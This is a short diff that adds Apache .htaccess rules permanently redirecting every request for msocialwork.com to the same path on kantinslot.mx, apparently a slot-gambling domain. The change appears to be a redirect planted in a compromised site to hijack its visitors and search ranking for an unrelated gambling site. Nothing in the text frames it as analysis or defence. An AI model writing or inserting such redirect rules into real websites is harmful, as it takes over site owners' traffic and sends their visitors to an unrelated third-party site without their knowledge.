@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{HTTP_HOST} ^(www\.)?msocialwork\.com$ [NC]
+RewriteRule ^(.*)$ https://kantinslot.mx/$1 [R=301,L]
